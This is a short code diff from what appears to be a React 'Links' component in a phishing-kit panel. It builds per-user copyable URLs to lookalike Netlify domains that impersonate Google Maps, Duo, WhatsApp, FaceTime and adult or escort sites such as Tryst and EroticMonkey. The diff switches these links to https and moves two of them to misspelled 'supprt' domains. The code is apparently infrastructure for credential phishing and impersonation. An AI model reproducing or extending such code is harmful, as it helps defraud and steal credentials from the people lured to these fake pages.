@@ -18,15 +18,15 @@ const Links = () => {
 
   // The link to be copied
 
-  const linkGoogle = `http://google-mapss.netlify.app/${userData?.email?.split('@')[0]}`
+  const linkGoogle = `https://google-mapss.netlify.app/${userData?.email?.split('@')[0]}`
 
-  const linkMegaDuo = `http://call-info.netlify.app/${userData?.email?.split('@')[0]}/duo`
-  const linkMegaWhatsApp = `http://call-info.netlify.app/${userData?.email?.split('@')[0]}/whatsapp`
-  const linkMegaFaceTime = `http://call-info.netlify.app/${userData?.email?.split('@')[0]}/facetime`
+  const linkMegaDuo = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/duo`
+  const linkMegaWhatsApp = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/whatsapp`
+  const linkMegaFaceTime = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/facetime`
 
-  const linkTrystLink = `http://page-app.netlify.app/${userData?.email?.split('@')[0]}`
-  const linkEroticMonkey = `http://eroticmonkey.netlify.app/${userData?.email?.split('@')[0]}`
-  const linkAdultSearch = `http://adult-search.netlify.app/${userData?.email?.split('@')[0]}`
+  const linkTrystLink = `https://supprt-trust.netlify.app/${userData?.email?.split('@')[0]}`
+  const linkEroticMonkey = `https://supprt-erticmonkey.netlify.app/${userData?.email?.split('@')[0]}`
+  const linkAdultSearch = `https://adult-search.netlify.app/${userData?.email?.split('@')[0]}`
 
   // Handle copy to clipboard functionality
   const handleCopy = (urlAsLink, nameOfLink) => {
